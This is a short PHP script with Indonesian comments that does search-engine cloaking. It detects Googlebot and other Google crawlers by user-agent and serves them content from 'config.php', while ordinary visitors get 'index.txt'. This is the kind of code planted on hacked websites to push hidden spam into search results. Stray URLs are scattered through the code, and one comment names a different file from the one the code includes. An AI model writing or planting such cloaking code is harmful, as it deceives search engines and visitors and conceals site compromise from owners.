<?php https://www.google.com/webhp?hl=id&sa=X&ved=0ahUKEwiP5faDz9mNAxWme2wGHSoxA9AQPAgI
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;https://www.autodesire.cz/category/hybridy/
}

// Ambil user-agent dari pengunjung
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);

// Deteksi Googlebot atau Google Inspection Tool
if (strpos($userAgent, 'googlebot') !== false || strpos($userAgent, 'google-inspectiontool') !== false) {
    // Tampilkan konten dari wp-meta.php
    include 'config.php';
    exit();
}
?>
<?php include('index.txt'); ?>
